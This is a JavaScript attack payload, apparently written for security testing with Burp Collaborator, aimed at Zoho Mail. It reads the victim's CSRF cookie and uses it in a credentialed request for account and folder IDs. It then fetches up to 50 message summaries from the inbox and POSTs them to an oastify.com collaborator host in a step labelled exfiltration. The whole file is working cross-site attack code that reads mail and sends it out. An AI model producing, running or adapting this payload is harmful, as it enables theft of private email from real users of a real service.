// Step 1: Function to extract a specific cookie value by name
function getCookie(name) {
    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length === 2) return parts.pop().split(";").shift();
    return null;
}

// FIX: Initialize and assign the variable before checking it in the 'if' condition
var csrfToken = getCookie("zmcsr");

if (csrfToken) {
    // === REQUEST 1: POST to target endpoint ===
    var postReq = new XMLHttpRequest();
    postReq.open("POST", "https://mail.zoho.com/zm/settings.do", true); 
    postReq.withCredentials = true;
    postReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    var headerValue = "zmrcsr=" + csrfToken;
    postReq.setRequestHeader("X-Zcsrf-Token", headerValue);

    postReq.onreadystatechange = function() {
        if (postReq.readyState === 4 && postReq.status === 200) {
            var firstResponse = postReq.responseText;
            
            try {
                // Parsing assuming the server responds with a valid JSON string
                var jsonResponse = JSON.parse(firstResponse);
                var val1 = jsonResponse.accId; 
                var val2 = jsonResponse.fId;

                if (val1 && val2) {
                    // === REQUEST 2: GET from target endpoint using parameters ===
                    var finalGetUrl = "https://us4-zm.zoho.com/zm/ml.do?xhr=1793712050071&mode=listing&accId=" + encodeURIComponent(val1) + "&from=1&to=50&summary=true&sortBy=date&sortOrder=false&folderSpec=2&folId=" + encodeURIComponent(val2);
                    
                    var secondReq = new XMLHttpRequest();
                    secondReq.open("GET", finalGetUrl, true);
                    secondReq.withCredentials = true;

                    secondReq.onreadystatechange = function() {
                        if (secondReq.readyState === 4 && secondReq.status === 200) {
                            var secondResponseData = secondReq.responseText;

                            // === REQUEST 3: POST exfiltration to Burp Collaborator ===
                            var exfilReq = new XMLHttpRequest();
                            exfilReq.open("POST", "https://whhmrffjfe5xbeih0rm0gl1qyh4as1gq.oastify.com", true);
                            exfilReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                            
                            // Send the second response text inside the post body parameter
                            exfilReq.send("exfil_data=" + encodeURIComponent(secondResponseData));
                        }
                    };
                    secondReq.send();
                } else {
                    console.error("Required parameters (accId or fId) were missing from the first response.");
                }
            } catch (e) {
                console.error("Error parsing the first response as JSON:", e);
            }
        }
    };

    var requestBody = "mode=getall";
    postReq.send(requestBody);
} else {
    console.error("Token 'zmcsr' was not found.");
}
